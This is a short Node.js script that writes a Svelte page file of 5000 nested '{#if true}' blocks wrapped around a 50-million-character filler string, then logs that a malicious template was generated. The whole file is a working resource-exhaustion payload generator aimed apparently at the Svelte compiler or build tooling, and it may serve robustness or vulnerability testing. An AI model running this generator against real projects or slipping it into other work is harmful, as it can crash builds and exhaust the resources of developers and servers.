import { writeFileSync } from "node:fs";

const depth = 5000;
const payloadSize = 50000000;

let s = "";

// Deep nesting
for (let i = 0; i < depth; i++) {
  s += "{#if true}\n";
}

// Huge payload
s += "A".repeat(payloadSize);

// Close nesting
for (let i = 0; i < depth; i++) {
  s += "{/if}\n";
}

writeFileSync("src/routes/+page.svelte", s);

console.log("🔥 Malicious template generated");